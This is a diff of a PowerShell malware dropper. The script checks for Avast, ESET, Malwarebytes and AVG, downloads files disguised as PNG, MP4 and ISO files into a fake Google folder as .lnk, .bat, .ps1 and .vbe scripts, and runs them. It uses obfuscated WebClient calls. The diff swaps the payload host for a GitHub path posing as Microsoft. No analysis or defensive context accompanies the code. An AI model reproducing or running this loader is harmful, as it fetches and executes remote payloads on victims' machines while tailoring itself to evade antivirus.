@@ -3,7 +3,7 @@
 
 
 
-start-sleep -s 3
+start-sleep -s 9
 [system.io.directory]::CreateDirectory("C:\ProgramData\Google\Maps\")
 
 start-sleep -s 3
@@ -23,12 +23,12 @@ if([System.IO.File]::Exists("C:\Program Files\Avast Software\Avast\AvastUI.exe")
 
 start-sleep -s 3
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/Maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/GoogleUpdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/googleupdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
 
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
 
 
 
@@ -41,12 +41,12 @@ Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
 elseif([System.IO.File]::Exists("C:\Program Files\ESET\ESET Security\ecmds.exe")){
 
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/Maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/GoogleUpdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/googleupdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
 
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/dos.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/dos.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
 
 
 
@@ -59,12 +59,12 @@ Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
 
 elseif([System.IO.File]::Exists("C:\Program Files\Malwarebytes\Anti-Malware\mbamtray.exe")){
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/Maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/GoogleUpdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/googleupdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
 
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
 
 
 
@@ -78,12 +78,12 @@ Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
 elseif([System.IO.File]::Exists("C:\Program Files\AVG\Antivirus\AVGUI.exe")){
 
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/Maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/GoogleUpdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/googleupdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
 
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
 
 
 
@@ -107,23 +107,23 @@ start-sleep -s 3
  
 
  
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/Defender.iso', 'C:\ProgramData\Google\Maps\Defender.lnk') }"
+ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.iso', 'C:\ProgramData\Google\Maps\Defender.lnk') }"
  start-sleep -s 3
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/Wish.iso', 'C:\ProgramData\Google\Maps\Wish.lnk') }"
+ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/wish.iso', 'C:\ProgramData\Google\Maps\Wish.lnk') }"
   start-sleep -s 3
   
-  powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/Maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
+  powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
    start-sleep -s 3
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/Defender.mp4', 'C:\ProgramData\Google\Maps\Wish.ps1') }"
+ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.mp4', 'C:\ProgramData\Google\Maps\Wish.ps1') }"
 
 start-sleep -s 3
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/Defender.png', 'C:\ProgramData\Google\Maps\Defender.bat') }"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.png', 'C:\ProgramData\Google\Maps\Defender.bat') }"
  start-sleep -s 3
 
  
  start-sleep -s 3
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/Wish.png', 'C:\ProgramData\Google\Maps\Wish.bat') }"
+ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/wish.png', 'C:\ProgramData\Google\Maps\Wish.bat') }"
 
 
  start-sleep -s 3
@@ -134,7 +134,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://bariloc
 
 
 
-if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('http://barilochekayak.com.ar/office/img/all.wmv', $defender + 'AddUsers.ps1')){
+if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/microsoft-services/staff/settings/all.wmv', $defender + 'AddUsers.ps1')){
 }
 
  $def = 'C:\Prog^^^^^^^^^^^^^^^^^^le\Maps\'.Replace("^^^^^^^^^^^^^^^^^^","ramData\Goog")
@@ -143,7 +143,7 @@ if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('http://
 
 
 
-if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('http://barilochekayak.com.ar/office/img/ss.png', $def + 'Google.vbe')){
+if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/microsoft-services/staff/settings/ss.png', $def + 'Google.vbe')){
 }
 
 
@@ -154,10 +154,10 @@ start-sleep -s 9
  Start "C:\ProgramData\Google\Maps\Wish.lnk"
 start-sleep -s 9
 
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
+ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/uno.png', 'C:\ProgramData\Google\Maps\Maps.ps1') }"
 
 start-sleep -s 3
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://barilochekayak.com.ar/office/img/GoogleUpdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
+ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/googleupdate.img', 'C:\ProgramData\Google\Maps\Maps.bat') }"
 
 
 
